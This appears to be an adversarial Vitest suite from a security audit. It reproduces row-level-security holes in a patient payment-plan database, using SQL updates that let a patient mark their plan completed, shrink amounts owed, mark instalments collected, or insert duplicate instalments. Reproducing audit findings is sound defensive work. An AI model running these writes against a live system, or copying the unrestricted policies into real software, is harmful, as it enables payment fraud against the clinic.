// @vitest-environment node
//
// ─── SECURITY AUDIT PROOF-OF-CONCEPT — 2026-09 ────────────────────────────
//
// These tests are ADVERSARIAL. Each one demonstrates a live hole rather
// than guarding a fix, so several of them are expected to FAIL once the
// corresponding fix lands — that is the point. They exist so the report's
// claims can be reproduced rather than taken on trust.
//
// Every test runs as `app_user`, a NON-superuser role, because pglite's
// default role bypasses RLS unconditionally and would make an RLS suite
// pass identically with the policies removed. Policy bodies are copied
// VERBATIM from the migrations named in each block.
//
// Scope: exactly the two policies a patient's browser can drive directly
// against PostgREST with the public anon key + their own JWT
// (NEXT_PUBLIC_SUPABASE_ANON_KEY is in the client bundle by construction —
// see lib/supabase/client.ts).

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { PGlite } from '@electric-sql/pglite';

// Minimal schema: only the columns the policies and the attacks touch.
// Shapes mirror supabase/migrations/0001_initial_schema.sql.
const SCHEMA = `
  create role app_user nologin;

  create table profiles (
    id uuid primary key,
    role text,
    email text unique not null
  );
  create table practices (
    id uuid primary key,
    name text
  );
  create table plans (
    id uuid primary key,
    patient_id  uuid references profiles(id),
    practice_id uuid references practices(id),
    total_amount numeric(10,2) not null,
    instalment_amount numeric(10,2),
    plan_type int,
    status text not null default 'pending_acceptance',
    completed_at timestamptz
  );
  create table payments (
    id uuid primary key,
    plan_id uuid references plans(id),
    patient_id uuid references profiles(id),
    instalment_number integer not null,
    amount numeric(10,2) not null,
    due_date date not null,
    status text default 'scheduled',
    collected_at timestamptz
  );

  create table _current_user (id uuid);
  create schema if not exists auth;
  create or replace function auth.uid() returns uuid
    language sql stable as $$ select id from _current_user limit 1 $$;

  -- 0002
  create or replace function is_platform_admin() returns boolean
    language sql stable security definer set search_path = public as $$
      select exists (select 1 from profiles where id = auth.uid() and role = 'admin')
    $$;

  alter table plans    enable row level security;
  alter table payments enable row level security;

  -- ── VERBATIM from 0002_rls_policies.sql ──
  create policy "patients_select_own_plans" on plans
    for select using (patient_id = auth.uid());
  create policy "patients_select_own_payments" on payments
    for select using (patient_id = auth.uid());

  -- ── VERBATIM from 0007_plan_acceptance.sql ──
  create policy "patients_update_own_plans" on plans
    for update using (patient_id = auth.uid()) with check (patient_id = auth.uid());
  create policy "patients_update_own_payments" on payments
    for update using (patient_id = auth.uid()) with check (patient_id = auth.uid());

  -- ── VERBATIM from 0011_patient_insert_payments.sql ──
  create policy "patients_insert_payments_for_own_plans" on payments
    for insert with check (
      exists (select 1 from plans where plans.id = payments.plan_id and plans.patient_id = auth.uid())
    );

  grant usage on schema public, auth to app_user;
  grant select, insert, update, delete on all tables in schema public to app_user;
  grant execute on all functions in schema public to app_user;
  grant execute on all functions in schema auth to app_user;
`;

const PATIENT  = '11111111-1111-1111-1111-111111111111';
const OTHER    = '22222222-2222-2222-2222-222222222222';
const PRACTICE = '33333333-3333-3333-3333-333333333333';
const PLAN     = '44444444-4444-4444-4444-444444444444';
const PAY1     = '55555555-5555-5555-5555-555555555551';
const PAY2     = '55555555-5555-5555-5555-555555555552';

let db: PGlite;

/** Run a statement as the RLS-bound `app_user`, acting as `uid`. */
async function asPatient(uid: string, sql: string) {
  await db.exec('delete from _current_user;');
  await db.query('insert into _current_user (id) values ($1)', [uid]);
  await db.exec('set role app_user;');
  try {
    return await db.query(sql);
  } finally {
    await db.exec('reset role;');
  }
}

beforeAll(async () => {
  db = new PGlite();
  await db.exec(SCHEMA);
});

afterAll(async () => { await db?.close(); });

async function seed() {
  await db.exec('reset role;');
  await db.exec('delete from payments; delete from plans; delete from practices; delete from profiles;');
  await db.query('insert into profiles (id, role, email) values ($1,$2,$3)', [PATIENT, 'patient', 'p@x.test']);
  await db.query('insert into profiles (id, role, email) values ($1,$2,$3)', [OTHER,   'patient', 'o@x.test']);
  await db.query('insert into practices (id, name) values ($1,$2)', [PRACTICE, 'Clinic']);
  await db.query(
    `insert into plans (id, patient_id, practice_id, total_amount, instalment_amount, plan_type, status)
     values ($1,$2,$3,10000.00,5000.00,2,'active')`,
    [PLAN, PATIENT, PRACTICE],
  );
  await db.query(
    `insert into payments (id, plan_id, patient_id, instalment_number, amount, due_date, status, collected_at)
     values ($1,$2,$3,1,5000.00,'2026-09-01','collected', now())`,
    [PAY1, PLAN, PATIENT],
  );
  await db.query(
    `insert into payments (id, plan_id, patient_id, instalment_number, amount, due_date, status)
     values ($1,$2,$3,2,5000.00,'2026-10-01','scheduled')`,
    [PAY2, PLAN, PATIENT],
  );
}

describe('AUDIT F-01 — patients_update_own_plans is column-unrestricted (0007)', () => {
  beforeAll(seed);

  it('lets a patient mark their own live plan `completed` — debt erased', async () => {
    await asPatient(PATIENT, `update plans set status = 'completed', completed_at = now() where id = '${PLAN}'`);
    await db.exec('reset role;');
    const { rows } = await db.query<{ status: string }>(`select status from plans where id = '${PLAN}'`);
    // EXPLOIT SUCCEEDS today. When the column-lock lands this becomes 'active'.
    expect(rows[0].status).toBe('completed');
  });

  it('lets a patient rewrite total_amount and instalment_amount on their own plan', async () => {
    await seed();
    await asPatient(PATIENT, `update plans set total_amount = 0.01, instalment_amount = 0.01 where id = '${PLAN}'`);
    await db.exec('reset role;');
    const { rows } = await db.query<{ total_amount: string }>(`select total_amount from plans where id = '${PLAN}'`);
    expect(Number(rows[0].total_amount)).toBe(0.01);
  });

  it('does NOT let a patient touch another patient\'s plan (the one thing 0007 does enforce)', async () => {
    await seed();
    await asPatient(OTHER, `update plans set status = 'completed' where id = '${PLAN}'`);
    await db.exec('reset role;');
    const { rows } = await db.query<{ status: string }>(`select status from plans where id = '${PLAN}'`);
    expect(rows[0].status).toBe('active');
  });
});

describe('AUDIT F-02 — patients_update_own_payments is column-unrestricted (0007)', () => {
  beforeAll(seed);

  it('lets a patient mark every outstanding instalment `collected` for free', async () => {
    await asPatient(
      PATIENT,
      `update payments set status = 'collected', collected_at = now() where patient_id = '${PATIENT}'`,
    );
    await db.exec('reset role;');
    const { rows } = await db.query<{ n: string }>(
      `select count(*)::text as n from payments where plan_id = '${PLAN}' and status <> 'collected'`,
    );
    expect(Number(rows[0].n)).toBe(0);
  });

  it('lets a patient zero the amount of a scheduled instalment before it is charged', async () => {
    await seed();
    await asPatient(PATIENT, `update payments set amount = 0 where id = '${PAY2}'`);
    await db.exec('reset role;');
    const { rows } = await db.query<{ amount: string }>(`select amount from payments where id = '${PAY2}'`);
    expect(Number(rows[0].amount)).toBe(0);
  });
});

describe('AUDIT F-03 — payments has no UNIQUE (plan_id, instalment_number)', () => {
  beforeAll(seed);

  it('accepts a duplicate instalment row for the same plan', async () => {
    // This is what makes the acceptPlan / payWithSavedCard check-then-write
    // race (two concurrent calls both passing the pending_acceptance SELECT)
    // materialise as a duplicated schedule instead of a constraint violation.
    const dup = '66666666-6666-6666-6666-666666666666';
    await db.exec('reset role;');
    await db.query(
      `insert into payments (id, plan_id, patient_id, instalment_number, amount, due_date, status)
       values ($1,$2,$3,1,5000.00,'2026-09-01','processing')`,
      [dup, PLAN, PATIENT],
    );
    const { rows } = await db.query<{ n: string }>(
      `select count(*)::text as n from payments where plan_id = '${PLAN}' and instalment_number = 1`,
    );
    expect(Number(rows[0].n)).toBe(2);
  });
});
